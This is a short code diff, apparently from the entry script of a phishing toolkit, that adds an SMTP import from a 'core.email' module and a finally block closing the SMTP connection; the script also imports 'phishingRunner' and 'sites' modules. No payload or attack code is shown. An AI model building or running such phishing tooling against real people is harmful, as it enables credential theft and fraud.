@@ -34,6 +34,7 @@ except:
     
 from core.phishingRunner import *
 from core.sites import site
+from core.email import objsmtp
 from smtplib import *
 
 def main():
@@ -107,4 +108,5 @@ if __name__ == "__main__":
     except KeyboardInterrupt:
         end()
         exit(0)
-       
+    finally:
+        if objsmtp(): objsmtp().quit()
